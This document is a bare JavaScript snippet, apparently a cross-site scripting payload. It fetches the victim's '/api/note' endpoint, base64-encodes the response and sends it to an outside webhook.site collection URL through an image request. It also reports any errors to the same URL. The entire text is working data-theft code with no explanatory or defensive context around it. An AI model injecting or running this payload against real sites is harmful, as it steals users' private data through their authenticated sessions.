fetch('/api/note')
  .then(r => r.text())
  .then(txt => {
    new Image().src = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?dump=' + btoa(txt);
  })
  .catch(e => {
    new Image().src = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?fail=' + encodeURIComponent(e.message);
  });
